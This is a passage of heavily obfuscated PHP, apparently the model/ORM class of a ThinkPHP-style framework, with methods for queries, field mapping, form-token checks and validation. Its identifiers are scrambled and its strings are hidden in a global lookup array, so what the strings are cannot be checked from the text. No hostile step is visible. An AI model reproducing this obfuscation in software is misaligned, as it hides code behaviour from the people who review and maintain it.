(is_numeric($àµ·¤§) || is_string($àµ·¤§)) { $óíÜ¦[$this->getPk()] = intval($àµ·¤§); $this->options[$±Æï«‡û[355]] = $óíÜ¦; } $this->options[$±Æï«‡û[370]] = 1; $àµ·¤§ = $this->_parseOptions(); $¸ØÓ¤ÓŞ = $this->db->select($àµ·¤§); if (!1 === $¸ØÓ¤ÓŞ) { return !1; } if (empty($¸ØÓ¤ÓŞ)) { return null; } $ŠîÏï‹Ü = $¸ØÓ¤ÓŞ[0]; $this->_afterFind($ŠîÏï‹Ü, $àµ·¤§); return $ŠîÏï‹Ü; } protected function _afterFind(&$é‰‡öÔ, $Ôâ·Û™£) { } protected function returnResult($¿Ï‘¥¯Ÿ, $üæÀÈã… = '') { $Ûæƒ—’ı =& $_SERVER[ùèÅ´Ãš]; if ($üæÀÈã…) { if (is_callable($üæÀÈã…)) { return call_user_func($üæÀÈã…, $¿Ï‘¥¯Ÿ); } switch (strtolower($üæÀÈã…)) { case $Ûæƒ—’ı[371]: return json_encode($¿Ï‘¥¯Ÿ); case $Ûæƒ—’ı[372]: return xml_encode($¿Ï‘¥¯Ÿ); } } return $¿Ï‘¥¯Ÿ; } public function parseFieldsMap($é×ÙÖ‡, $Ä°ï§§ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $Ôâı­Ì´ => $ƒ£‹ùÃƒ) { if ($Ä°ï§§ == 1) { if (isset($é×ÙÖ‡[$ƒ£‹ùÃƒ])) { $é×ÙÖ‡[$Ôâı­Ì´] = $é×ÙÖ‡[$ƒ£‹ùÃƒ]; unset($é×ÙÖ‡[$ƒ£‹ùÃƒ]); } } else { if (isset($é×ÙÖ‡[$Ôâı­Ì´])) { $é×ÙÖ‡[$ƒ£‹ùÃƒ] = $é×ÙÖ‡[$Ôâı­Ì´]; unset($é×ÙÖ‡[$Ôâı­Ì´]); } } } } return $é×ÙÖ‡; } public function setField($Ëó Âºì, $õµÕöù» = '') { if (is_array($Ëó Âºì)) { $¸ŒêŞ±ƒ = $Ëó Âºì; } else { $¸ŒêŞ±ƒ[$Ëó Âºì] = $õµÕöù»; } return $this->save($¸ŒêŞ±ƒ); } public function setAdd($ ™¹“ÍŸ, $‡úóÏş¯ = 1) { $öŒƒˆ›µ =& $_SERVER[ùèÅ´Ãš]; $ÒãÇÃ«‚ = $ ™¹“ÍŸ . $öŒƒˆ›µ[373] . $‡úóÏş¯; if ($‡úóÏş¯ < 0) { $ÒãÇÃ«‚ = $ ™¹“ÍŸ . $‡úóÏş¯; } return $this->setField($ ™¹“ÍŸ, array($öŒƒˆ›µ[374], $ÒãÇÃ«‚)); } public function getField($›¦”å¨—, $é’Íí¯Ò = null) { $Ÿ ¡›şŸ =& $_SERVER[ùèÅ´Ãš]; $Ó‡¡Î‡ª[$Ÿ ¡›şŸ[353]] = $›¦”å¨—; $Ó‡¡Î‡ª = $this->_parseOptions($Ó‡¡Î‡ª); $›¦”å¨— = trim($›¦”å¨—); if (strpos($›¦”å¨—, $Ÿ ¡›şŸ[50])) { if (!isset($Ó‡¡Î‡ª[$Ÿ ¡›şŸ[370]])) { $Ó‡¡Î‡ª[$Ÿ ¡›şŸ[370]] = is_numeric($é’Íí¯Ò) ? $é’Íí¯Ò : $Ÿ ¡›şŸ[12]; } $ÈÓˆÛï¹ = $this->db->select($Ó‡¡Î‡ª); if (!empty($ÈÓˆÛï¹)) { $¨ïÔæÂ = explode($Ÿ ¡›şŸ[50], $›¦”å¨—); $›¦”å¨— = array_keys($ÈÓˆÛï¹[0]); $²•ãİÅƒ = array_shift($›¦”å¨—); $èîå«íâ = array_shift($›¦”å¨—); $ƒ”ë—¿„ = array(); $¤Ù»†Ÿˆ = count($¨ïÔæÂ); foreach ($ÈÓˆÛï¹ as $ìƒ˜¡Ñ) { $úº¬ÍÊ” = $ìƒ˜¡Ñ[$²•ãİÅƒ]; if (2 == $¤Ù»†Ÿˆ) { $ƒ”ë—¿„[$úº¬ÍÊ”] = $ìƒ˜¡Ñ[$èîå«íâ]; } else { $ƒ”ë—¿„[$úº¬ÍÊ”] = is_string($é’Íí¯Ò) ? implode($é’Íí¯Ò, $ìƒ˜¡Ñ) : $ìƒ˜¡Ñ; } } return $ƒ”ë—¿„; } } else { if (!0 !== $é’Íí¯Ò) { $Ó‡¡Î‡ª[$Ÿ ¡›şŸ[370]] = is_numeric($é’Íí¯Ò) ? $é’Íí¯Ò : 1; } if ($é’Íí¯Ò === $Ÿ ¡›şŸ[335]) { unset($Ó‡¡Î‡ª[$Ÿ ¡›şŸ[370]]); } $ìƒ˜¡Ñ = $this->db->select($Ó‡¡Î‡ª); if (!empty($ìƒ˜¡Ñ)) { if ($é’Íí¯Ò === $Ÿ ¡›şŸ[335]) { return reset($ìƒ˜¡Ñ[0]); } if (!0 !== $é’Íí¯Ò && 1 == $Ó‡¡Î‡ª[$Ÿ ¡›şŸ[370]]) { return reset($ìƒ˜¡Ñ[0]); } foreach ($ìƒ˜¡Ñ as $ûØ™Ï¸è) { $¸ÅªâœÕ[] = $ûØ™Ï¸è[$›¦”å¨—]; } return $¸ÅªâœÕ; } } return null; } public function create($ÔÔ‘íÈ = '', $²à°“Ç = '') { $íæ§¬İ¹ =& $_SERVER[ùèÅ´Ãš]; if (empty($ÔÔ‘íÈ)) { $ÔÔ‘íÈ = $_POST; } elseif (is_object($ÔÔ‘íÈ)) { $ÔÔ‘íÈ = get_object_vars($ÔÔ‘íÈ); } if (empty($ÔÔ‘íÈ) || !is_array($ÔÔ‘íÈ)) { $this->error = think_lang($íæ§¬İ¹[351]); return !1; } $ÔÔ‘íÈ = $this->parseFieldsMap($ÔÔ‘íÈ, 0); $²à°“Ç = $²à°“Ç ? $²à°“Ç : (!empty($ÔÔ‘íÈ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$íæ§¬İ¹[353]])) { $îÆ‚Ú× = $this->options[$íæ§¬İ¹[353]]; unset($this->options[$íæ§¬İ¹[353]]); } elseif ($²à°“Ç == THINK_MODEL_INSERT && isset($this->insertFields)) { $îÆ‚Ú× = $this->insertFields; } elseif ($²à°“Ç == THINK_MODEL_UPDATE && isset($this->updateFields)) { $îÆ‚Ú× = $this->updateFields; } if (isset($îÆ‚Ú×)) { if (is_string($îÆ‚Ú×)) { $îÆ‚Ú× = explode($íæ§¬İ¹[50], $îÆ‚Ú×); } if (think_config($íæ§¬İ¹[375])) { $îÆ‚Ú×[] = think_config($íæ§¬İ¹[376]); } foreach ($ÔÔ‘íÈ as $”ÜË¯¨ü => $Ñ“ÌúÆÏ) { if (!in_array($”ÜË¯¨ü, $îÆ‚Ú×)) { unset($ÔÔ‘íÈ[$”ÜË¯¨ü]); } } } if (!$this->autoValidation($ÔÔ‘íÈ, $²à°“Ç)) { return !1; } if (!$this->autoCheckToken($ÔÔ‘íÈ)) { $this->error = think_lang($íæ§¬İ¹[377]); return !1; } if ($this->autoCheckFields) { $îÆ‚Ú× = $this->getDbFields(); foreach ($ÔÔ‘íÈ as $”ÜË¯¨ü => $Ñ“ÌúÆÏ) { if (!in_array($”ÜË¯¨ü, $îÆ‚Ú×)) { unset($ÔÔ‘íÈ[$”ÜË¯¨ü]); } elseif (MAGIC_QUOTES_GPC && is_string($Ñ“ÌúÆÏ)) { $ÔÔ‘íÈ[$”ÜË¯¨ü] = stripslashes($Ñ“ÌúÆÏ); } } } $this->autoOperation($ÔÔ‘íÈ, $²à°“Ç); $this->data = $ÔÔ‘íÈ; return $ÔÔ‘íÈ; } public function autoCheckToken($Îìˆ»¢¹) { $Øã¥²Òò =& $_SERVER[ùèÅ´Ãš]; if (isset($this->options[$Øã¥²Òò[378]]) && !$this->options[$Øã¥²Òò[378]]) { return !0; } if (think_config($Øã¥²Òò[375])) { $ê•´ò¥È = think_config($Øã¥²Òò[376]); if (!isset($Îìˆ»¢¹[$ê•´ò¥È]) || Session::get($ê•´ò¥È)) { return !1; } list($©õ©÷¥Á, $Ë›äš¥ı) = explode($Øã¥²Òò[11], $Îìˆ»¢¹[$ê•´ò¥È]); if ($Ë›äš¥ı && Session::get($ê•´ò¥È . $Øã¥²Òò[10] . $©õ©÷¥Á) === $Ë›äš¥ı) { Session::remove($ê•´ò¥È . $Øã¥²Òò[10] . $©õ©÷¥Á); return !0; } if (think_config($Øã¥²Òò[379])) { Session::remove($ê•´ò¥È . $Øã¥²Òò[10] . $©õ©÷¥Á); } return !1; } return !0; } public function regex($çœ”öÄ–, $ Ç†Úò²) { $í³êƒğÔ =& $_SERVER[ùèÅ´Ãš]; $æŞÕ‡áŞ = array($í³êƒğÔ[380] => $í³êƒğÔ[381], $í³êƒğÔ[382] => $í³êƒğÔ[383], $í³êƒğÔ[384] => $í³êƒğÔ[385], $í³êƒğÔ[386] => $í³êƒğÔ[387], $í³êƒğÔ[388] => $í³êƒğÔ[389], $í³êƒğÔ[390] => $í³êƒğÔ[391], $í³êƒğÔ[392] => $í³êƒğÔ[393], $í³êƒğÔ[368] => $í³êƒğÔ[394], $í³êƒğÔ[395] => $í³êƒğÔ[396]); if (isset($æŞÕ‡áŞ[strtolower($ Ç†Úò²)])) { $ Ç†Úò² = $æŞÕ‡áŞ[strtolower($ Ç†Úò²)]; } return preg_match($ Ç†Úò², $çœ”öÄ–) === 1; } private function autoOperation(&$•÷Ş˜Ô, $²ùôÕõ») { $ã‰³Ÿ£ß =& $_SERVER[ùèÅ´Ãš]; if (!empty($this->options[$ã‰³Ÿ£ß[397]])) { $¾¡ïÏ– = $this->options[$ã‰³Ÿ£ß[397]]; unset($this->options[$ã‰³Ÿ£ß[397]]); } elseif (!empty($this->_auto)) { $¾¡ïÏ– = $this->_auto; } if (isset($¾¡ïÏ–)) { foreach ($¾¡ïÏ– as $«ÏÌÅãš) { if (empty($«ÏÌÅãš[2])) { $«ÏÌÅãš[2] = THINK_MODEL_INSERT; } if ($²ùôÕõ» == $«ÏÌÅãš[2] || $«ÏÌÅãš[2] == THINK_MODEL_BOTH) { switch (trim($«ÏÌÅãš[3])) { case $ã‰³Ÿ£ß[398]: case $ã‰³Ÿ£ß[399]: $—Éš¬³å = isset($«ÏÌÅãš[4]) ? (array) $«ÏÌÅãš[4] : array(); if (isset($•÷Ş˜Ô[$«ÏÌÅãš[0]])) { array_unshift($—Éš¬³å, $•÷Ş˜Ô[$«ÏÌÅãš[0]]); } if ($ã‰³Ÿ£ß[398] == $«ÏÌÅãš[3]) { $•÷Ş˜Ô[$«ÏÌÅãš[0]] = call_user_func_array($«ÏÌÅãš[1], $—Éš¬³å); } else { $•÷Ş˜Ô[$«ÏÌÅãš[0]] = call_user_func_array(array(&$this, $«ÏÌÅãš[1]), $—Éš¬³å); } break; case $ã‰³Ÿ£ß[353]: $•÷Ş˜Ô[$«ÏÌÅãš[0]] = $•÷Ş˜Ô[$«ÏÌÅãš[1]]; break; case $ã‰³Ÿ£ß[400]: if ($ã‰³Ÿ£ß[12] === $•÷Ş˜Ô[$«ÏÌÅãš[0]]) { unset($•÷Ş˜Ô[$«ÏÌÅãš[0]]); } break; case $ã‰³Ÿ£ß[401]: default: $•÷Ş˜Ô[$«ÏÌÅãš[0]] = $«ÏÌÅãš[1]; } if (!1 === $•÷Ş˜Ô[$«ÏÌÅãš[0]]) { unset($•÷Ş˜Ô[$«ÏÌÅãš[0]]); } } } } return $•÷Ş˜Ô; } protected function autoValidation($ˆÉÇ±ğî, $‚ßş”÷ó) { $¬Áù×«´ =& $_SERVER[ùèÅ´Ãš]; if (!empty($this->options[$¬Áù×«´[402]])) { $ÔšëØúİ = $this->options[$¬Áù×«´[402]]; unset($this->options[$¬Áù×«´[402]]); } elseif (!empty($this->_validate)) { $ÔšëØúİ = $this->_validate; } if (isset($ÔšëØúİ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ÔšëØúİ as $€¤ö×¹ => $°Ò¬‡ùó) { if (empty($°Ò¬‡ùó[5]) || $°Ò¬‡ùó[5] == THINK_MODEL_BOTH || $°Ò¬‡ùó[5] == $‚ßş”÷ó) { if (0 == strpos($°Ò¬‡ùó[2], $¬Áù×«´[403]) && strpos($°Ò¬‡ùó[2], $¬Áù×«´[404])) { $°Ò¬‡ùó[2] = think_lang(substr($°Ò¬‡ùó[2], 2, -1)); } $°Ò¬‡ùó[3] = isset($°Ò¬‡ùó[3]) ? $°Ò¬‡ùó[3] : THINK_EXISTS_VALIDATE; $°Ò¬‡ùó[4] = isset($°Ò¬‡ùó[4]) ? $°Ò¬‡ùó[4] : $¬Áù×«´[405]; switch ($°Ò¬‡ùó[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($ˆÉÇ±ğî, $°Ò¬‡ùó)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($¬Áù×«´[12] != trim($ˆÉÇ±ğî[$°Ò¬‡ùó[0]])) { if (!1 === $this->_validationField($ˆÉÇ±ğî, $°Ò¬‡ùó)) { return !1; } } break; default: if (isset($ˆÉÇ±ğî[$°Ò¬‡ùó[0]])) { if (!1 === $this->_validationField($ˆÉÇ±ğî, $°Ò¬‡ùó)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($Õ¬ñ¥¤ş, $Ä”¦şôœ) { if (!1 === $this->_validationFieldItem($Õ¬ñ¥¤ş, $Ä”¦şôœ)) { if ($this->patchValidate) { $this->error[$Ä”¦şôœ[0]] = $Ä”¦şôœ[2]; } else { $this->error = $Ä”¦şôœ[2]; return !1; } } return; } protected function _validationFieldItem($éŠËå´‘, $ˆâÌ«ô˜) { $»ª¤€ÛÁ =& $_SERVER[ùèÅ´Ãš]; switch (strtolower(trim($ˆâÌ«ô˜[4]))) { case $»ª¤€ÛÁ[398]: case $»ª¤€ÛÁ[399]: $ö˜Å»×• = isset($ˆâÌ«ô˜[6]) ? (array) $ˆâÌ«ô˜[6] : array(); if (is_string($ˆâÌ«ô˜[0]) && strpos($ˆâÌ«ô˜[0], $»ª¤€ÛÁ[50])) { $ˆâÌ«ô˜[0] = explode($»ª¤€ÛÁ[50], $ˆâÌ«ô˜[0]); } if (is_array($ˆâÌ«ô˜[0])) { foreach ($ˆâÌ«ô˜[0] as $á¡˜çêÆ) { $÷Í«÷†¿[$á¡˜çêÆ] = $éŠËå´‘[$á¡˜çêÆ]; } array_unshift($ö˜Å»×•, $÷Í«÷†¿); } else { array_unshift($ö˜Å»×•, $éŠËå´‘[$ˆâÌ«ô˜[0]]); } if ($»ª¤€ÛÁ[398] == $ˆâÌ«ô˜[4]) { return call_user_func_array($ˆâÌ«ô˜[1], $ö˜Å»×•); } else { return call_user_func_array(array(&$this, $ˆâÌ«ô˜[1]), $ö˜Å»×•); } case $»ª¤€ÛÁ[406]: return $éŠËå´‘[$ˆâÌ«ô˜[0]] == $éŠËå´‘[$ˆâÌ«ô˜[1]]; case $»ª¤€ÛÁ[407]: if (is_string($ˆâÌ«ô˜[0]) && strpos($ˆâÌ«ô˜[0], $»ª¤€ÛÁ[50])) { $ˆâÌ«ô˜[0] = explode($»ª¤€ÛÁ[50], $ˆâÌ«ô˜[0]); } $®¸ü†á = array(); if (is_array($ˆâÌ«ô˜[0])) { foreach ($ˆâÌ«ô˜[0] as $á¡˜çêÆ) { $®¸ü†á[$á¡˜çêÆ] = $éŠËå´‘[$á¡˜çêÆ]; } } else { $®¸ü†á[$ˆâÌ«ô˜[0]] = $éŠËå´‘[$ˆâÌ«ô˜[0]]; } if (!empty($éŠËå´‘[$this->getPk()])) { $®¸ü†á[$this->getPk()] = array($»ª¤€ÛÁ[408], $éŠËå´‘[$this->getPk()]); } if ($this->where($®¸ü†á)->find()) { return !1; } return !0; default: return $this->check($éŠËå´‘[$ˆâÌ«ô˜[0]], $ˆâÌ«ô˜[1], $ˆâÌ«ô˜[4]); } } public function check($áÚ·Œ¦½, $ÒÌæÅÅ, $Ğİı¥Ëé = "\x72\145\x67\145\170") { $‘ô¬Í£ =& $_SERVER[ùèÅ´Ãš]; $Ğİı¥Ëé = strtolower(trim($Ğİı¥Ëé)); switch ($Ğİı¥Ëé) { case $‘ô¬Í£[7]: case $‘ô¬Í£[409]: $üãå¹Ä‹ = is_array($ÒÌæÅÅ) ? $ÒÌæÅÅ : explode($‘ô¬Í£[50], $ÒÌæÅÅ); return $Ğİı¥Ëé == $‘ô¬Í£[7] ? in_array($áÚ·Œ¦½, $üãå¹Ä‹) : !in_array($áÚ·Œ¦½, $üãå¹Ä‹); case $‘ô¬Í£[410]: case $‘ô¬Í£[411]: if (is_array($ÒÌæÅÅ)) { $˜Éí£æó = $ÒÌæÅÅ[0]; $·÷——˜Ğ = $ÒÌæÅÅ[1]; } else { list($˜Éí£æó, $·÷——˜Ğ) = explode($‘ô¬Í£[50], $ÒÌæÅÅ); } return $Ğİı¥Ëé == $‘ô¬Í£[410] ? $áÚ·Œ¦½ >= $˜Éí£æó && $áÚ·Œ¦½ <= $·÷——˜Ğ : $áÚ·Œ¦½ < $˜Éí£æó || $áÚ·Œ¦½ > $·÷——˜Ğ; case $‘ô¬Í£[412]: case $‘ô¬Í£[413]: return $Ğİı¥Ëé == $‘ô¬Í£[412] ? $áÚ·Œ¦½ == $ÒÌæÅÅ : $áÚ·Œ¦½ != $ÒÌæÅÅ; case $‘ô¬Í£[414]: $Åà„àë = mb_strlen($áÚ·Œ¦½, $‘ô¬Í£[415]); if (strpos($ÒÌæÅÅ, $‘ô¬Í£[50])) { list($˜Éí£æó, $·÷——˜Ğ) = explode($‘ô¬Í£[50], $ÒÌæÅÅ); return $Åà„àë >= $˜Éí£æó && $Åà„àë <= $·÷——˜Ğ; } else { return $Åà„àë == $ÒÌæÅÅ; } case $‘ô¬Í£[416]: list($Ì¶ºÏ…, $ÔÁÂº÷–) = explode($‘ô¬Í£[50], $ÒÌæÅÅ); if (!is_numeric($Ì¶ºÏ…)) { $Ì¶ºÏ… = strtotime($Ì¶ºÏ…); } if (!is_numeric($ÔÁÂº÷–)) { $ÔÁÂº÷– = strtotime($ÔÁÂº÷–); } return NOW_TIME >= $Ì¶ºÏ… && NOW_TIME <= $ÔÁÂº÷–; case $‘ô¬Í£[417]: return in_array(get_client_ip(), explode($‘ô¬Í£[50], $ÒÌæÅÅ)); case $‘ô¬Í£[418]: return !in_array(get_client_ip(), explode($‘ô¬Í£[50], $ÒÌæÅÅ)); case $‘ô¬Í£[405]: default: return $this->regex($áÚ·Œ¦½, $ÒÌæÅÅ); } } public function query($òÁ¶µ„û, $§±ª«…î = false) { $ôË¥ßı‚ =& $_SERVER[ùèÅ´Ãš]; if (!is_bool($§±ª«…î) && !is_array($§±ª«…î)) { $§±ª«…î = func_get_args(); array_shift($§±ª«…î); } $òÁ¶µ„û = str_replace(array($ôË¥ßı‚[288], $ôË¥ßı‚[419]), $ôË¥ßı‚[53], $òÁ¶µ„û); $òÁ¶µ„û = $this->parseSql($òÁ¶µ„û, $§±ª«…î); return $this->db->query($òÁ¶µ„û); } public function execute($„Ô€çéâ, $çõ‡Éï¾ = false) { if (!is_bool($çõ‡Éï¾) && !is_array($çõ‡Éï¾)) { $çõ‡Éï¾ = func_get_args(); array_shift($çõ‡Éï¾); } $„Ô€çéâ = $this->parseSql($„Ô€çéâ, $çõ‡Éï¾); return $this->db->execute($„Ô€çéâ); } protected function parseSql($ªŞÍÆô“, $Ú—Ÿœ¥ä) { $û£‘âî =& $_SERVER[ùèÅ´Ãš]; if (!0 === $Ú—Ÿœ¥ä) { $Ø¦”ÄÁŸ = $this->_parseOptions(); $ªŞÍÆô“ = $this->db->parseSql($ªŞÍÆô“, $Ø¦”ÄÁŸ); } elseif (is_array($Ú—Ÿœ¥ä)) { $Ú—Ÿœ¥ä = array_map(array($this->db, $û£‘âî[420]), $Ú—Ÿœ¥ä); $ªŞÍÆô“ = vsprintf($ªŞÍÆô“, $Ú—Ÿœ¥ä); } else { $ªŞÍÆô“ = strtr($ªŞÍÆô“, array($û£‘âî[421] => $this->getTableName(), $û£‘âî[422] => think_config($û£‘âî[324]))); } $this->db->setModel($this->name); return $ªŞÍÆô“; } public function db($¡û•’Àë = '', $¶†ë¥ŸÆ = '', $Ù¬ø½Øú = array()) { $Æàïô˜¾ =& $_SERVER[ùèÅ´Ãš]; if ($Æàïô˜¾[12] === $¡û•’Àë && $this->db) { return $this->db; } static $´¹¿…€´ = array(); static $÷âşŒò‚ = array(); if (!isset($÷âşŒò‚[$¡û•’Àë]) || isset($÷âşŒò‚[$¡û•’Àë]) && $¶†ë¥ŸÆ && $´¹¿…€´[$¡û•’Àë] != $¶†ë¥ŸÆ) { if (!empty($¶†ë¥ŸÆ) && is_string($¶†ë¥ŸÆ) && !1 === strpos($¶†ë¥ŸÆ, $Æàïô˜¾[8])) { $¶†ë¥ŸÆ = think_config($¶†ë¥ŸÆ); } $¡û•’Àë = think_guid($¶†ë¥ŸÆ); $÷âşŒò‚[$¡û•’Àë] = Db::getInstance($¶†ë¥ŸÆ); } elseif (NULL === $¶†ë¥ŸÆ) { $÷âşŒò‚[$¡û•’Àë]->close(); unset($÷âşŒò‚[$¡û•’Àë]); return; } if (!empty($Ù¬ø½Øú)) { if (is_string($Ù¬ø½Øú)) { parse_str($Ù¬ø½Øú, $Ù¬ø½Øú); } foreach ($Ù¬ø½Øú as $ºïØíƒı => $µ«”ÕÕœ) { $this->setProperty($ºïØíƒı, $µ«”ÕÕœ); } } $´¹¿…€´[$¡û•’Àë] = $¶†ë¥ŸÆ; $this->db = $÷âşŒò‚[$¡û•’Àë]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $¸ÖÍ‘Òû = get_class($this); if ($¸ÖÍ‘Òû == $_SERVER[ùèÅ´Ãš][423]) { return $this->name; } $this->name = substr($¸ÖÍ‘Òû, 0, -5); } return $this->name; } public function getTableName() { $²ûÓ’œü =& $_SERVER[ùèÅ´Ãš]; if (empty($this->trueTableName)) { $÷ÉÎ…æğ = !empty($this->tablePrefix) ? $this->tablePrefix : $²ûÓ’œü[12]; if (!empty($this->tableName)) { $÷ÉÎ…æğ .= $this->tableName; } else { $÷ÉÎ…æğ .= think_parse_name($this->name); } $this->trueTableName = strtolower($÷ÉÎ…æğ); } return (!empty($this->dbName) ? $this->dbName . $²ûÓ’œü[10] : $²ûÓ’œü[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $¾³ÕŒÌ¬ =& $_SERVER[ùèÅ´Ãš]; return isset($this->fields[$¾³ÕŒÌ¬[331]]) ? $this->fields[$¾³ÕŒÌ¬[331]] : $this->pk; } public function getDbFields() { $ÎªîÜĞ™ =& $_SERVER[ùèÅ´Ãš]; if (isset($this->options[$ÎªîÜĞ™[359]])) { $òØ«³ıÇ = $this->db->getFields($this->options[$ÎªîÜĞ™[359]]); return $òØ«³ıÇ ? array_keys($òØ«³ıÇ) : !1; } if ($this->fields) { $òØ«³ıÇ = $this->fields; unset($òØ«³ıÇ[$ÎªîÜĞ™[330]], $òØ«³ıÇ[$ÎªîÜĞ™[331]], $òØ«³ıÇ[$ÎªîÜĞ™[332]], $òØ«³ıÇ[$ÎªîÜĞ™[329]]); return $òØ«³ıÇ; } return !1; } public function data($ôœç˜ŠÍ = '') { $º¿ä³ª =& $_SERVER[ùèÅ´Ãš]; if ($º¿ä³ª[12] === $ôœç˜ŠÍ && !empty($this->data)) { return $this->data; } if (is_object($ôœç˜ŠÍ)) { $ôœç˜ŠÍ = get_object_vars($ôœç˜ŠÍ); } elseif (is_string($ôœç˜ŠÍ)) { parse_str($ôœç˜ŠÍ, $ôœç˜ŠÍ); } elseif (!is_array($ôœç˜ŠÍ)) { think_exception(think_lang($º¿ä³ª[351])); } $this->data = $ôœç˜ŠÍ; return $this; } public function join($Ø‹«É¹) { $©›˜½¶ˆ =& $_SERVER[ùèÅ´Ãš]; if (is_array($Ø‹«É¹)) { $this->options[$©›˜½¶ˆ[362]] = $Ø‹«É¹; } elseif (!empty($Ø‹«É¹)) { $this->options[$©›˜½¶ˆ[362]][] = $Ø‹«É¹; } return $this; } public function union($©ú©‰‚, $ÚÀ§˜Å¥ = false) { $ÌòÃ =& $_SERVER[ùèÅ´Ãš]; if (empty($©ú©‰‚)) { return $this; } if ($ÚÀ§˜Å¥) { $this->options[$ÌòÃ[424]][$ÌòÃ[425]] = !0; } if (is_object($©ú©‰‚)) { $©ú©‰‚ = get_object_vars($©ú©‰‚); } if (is_string($©ú©‰‚)) { $Ïã¾“Ñ = $©ú©‰‚; } elseif (is_array($©ú©‰‚)) { if (isset($©ú©‰‚[0])) { $this->options[$ÌòÃ[424]] = array_merge($this->options[$ÌòÃ[424]], $©ú©‰‚); return $this; } else { $Ïã¾“Ñ = $©ú©‰‚; } } else { think_exception(think_lang($ÌòÃ[351])); } $this->options[$ÌòÃ[424]][] = $Ïã¾“Ñ; return $this; } public function cache($ñ¯è Àì = true, $İ—‡ÀÚ = null, $ä“ŸƒÈÒ = '') { $Ğ÷î¥é =& $_SERVER[ùèÅ´Ãš]; if (!1 !== $ñ¯è Àì) { $this->options[$Ğ÷î¥é[426]] = array($Ğ÷î¥é[97] => $ñ¯è Àì, $Ğ÷î¥é[416] => $İ—‡ÀÚ, $Ğ÷î¥é[33] => $ä“ŸƒÈÒ); } return $this; } public function field($§×©‹â€, $Íùï¼Ÿê = false) { $„Ø‚·õ™ =& $_SERVER[ùèÅ´Ãš]; if (!0 === $§×©‹â€) { $µì«™šÚ = $this->getDbFields(); $§×©‹â€ = $µì«™šÚ ? $µì«™šÚ : $„Ø‚·õ™[223]; } elseif ($Íùï¼Ÿê) { if (is_string($§×©‹â€)) { $§×©‹â€ = explode($„Ø‚·õ™[50], $§×©‹â€); } $µì«™šÚ = $this->getDbFields(); $§×©‹â€ = $µì«™šÚ ? array_diff($µì«™šÚ, $§×©‹â€) : $§×©‹â€; } $this->options[$„Ø‚·õ™[353]] = $§×©‹â€; return $this; } public function scope($Ì®’À§ = '', $ü’¾‚á = NULL) { $™ïşéöŸ =& $_SERVER[ùèÅ´Ãš]; if ($™ïşéöŸ[12] === $Ì®’À§) { if (isset($this->_scope[$™ïşéöŸ[37]])) { $ÔÈàë÷ì = $this->_scope[$™ïşéöŸ[37]]; } else { return $this; } } elseif (is_string($Ì®’À§)) { $÷şşÓ›¡ = explode($™ïşéöŸ[50], $Ì®’À§); $ÔÈàë÷ì = array(); foreach ($÷şşÓ›¡ as $‚‚Êõµ±) { if (!isset($this->_scope[$‚‚Êõµ±])) { continue; } $ÔÈàë÷ì = array_merge($ÔÈàë÷ì, $this->_scope[$‚‚Êõµ±]); } if (!empty($ü’¾‚á) && is_array($ü’¾‚á)) { $ÔÈàë÷ì = array_merge($ÔÈàë÷ì, $ü’¾‚á); } } elseif (is_array($Ì®’À§)) { $ÔÈàë÷ì = $Ì®’À§; } if (is_array($ÔÈàë÷ì) && !empty($ÔÈàë÷ì)) { $this->options = array_merge($this->options, array_change_key_case($ÔÈàë÷ì)); } return $this; } public function where($âşŒÔóÔ, $ƒšôÒşĞ = null) { $„À¿ò¸º =& $_SERVER[ùèÅ´Ãš]; if (!is_null($ƒšôÒşĞ) && is_string($âşŒÔóÔ)) { if (!is_array($ƒšôÒşĞ)) { $ƒšôÒşĞ = func_get_args(); array_shift($ƒšôÒşĞ); } $ƒšôÒşĞ = array_map(array($this->db, $„À¿ò¸º[420]), $ƒšôÒşĞ); $âşŒÔóÔ = vsprintf($âşŒÔóÔ, $ƒšôÒşĞ); } elseif (is_object($âşŒÔóÔ)) { $âşŒÔóÔ = get_object_vars($âşŒÔóÔ); } elseif (is_array($âşŒÔóÔ)) { foreach ($âşŒÔóÔ as $·ãêïæ => $³ˆşúâ¤) { if ((is_numeric($·ãêïæ) || !$·ãêïæ) && is_string($³ˆşúâ¤)) { if (strpos($³ˆşúâ¤, $„À¿ò¸º[427]) === 0) { continue; } think_trace($„À¿ò¸º[428], $„À¿ò¸º[12], $„À¿ò¸º[49]); die; } } } if (is_string($âşŒÔóÔ) && $„À¿ò¸º[12] != $âşŒÔóÔ) { $Ûİ¥ÆØÊ = array(); $Ûİ¥ÆØÊ[$„À¿ò¸º[429]] = $âşŒÔóÔ; $âşŒÔóÔ = $Ûİ¥ÆØÊ; } if (isset($this->options[$„À¿ò¸º[355]])) { $this->options[$„À¿ò¸º[355]] = array_merge($this->options[$„À¿ò¸º[355]], $âşŒÔóÔ); } else { $this->options[$„À¿ò¸º[355]] = $âşŒÔóÔ; } return $this; } public function limit($Ë‘È³¼©, $µÀ×šÁ± = null) { $Ä×µ¾Ü =& $_SERVER[ùèÅ´Ãš]; $this->options[$Ä×µ¾Ü[370]] = is_null($µÀ×šÁ±) ? $Ë‘È³¼© : $Ë‘È³¼© . $Ä×µ¾Ü[50] . $µÀ×šÁ±; return $this; } public function page($ ¬Ãó•µ, $ÂÙº«ì¸ = null) { $ª¶Í†ŠÔ =& $_SERVER[ùèÅ´Ãš]; $this->options[$ª¶Í†ŠÔ[430]] = is_null($ÂÙº«ì¸) ? $ ¬Ãó•µ : $ ¬Ãó•µ . $ª¶Í†ŠÔ[50] . $ÂÙº«ì¸; return $this; } public function comment($—¹Š“Ø) { $this->options[$_SERVER[ùèÅ´Ãš][431]] = $—¹Š“Ø; return $this; } public function setProperty($Åñ— ¨, $õñÜŒ˜) { if (property_exists($this, $Åñ— ¨)) { $this->{$Åñ— ¨} = $õñÜŒ˜; 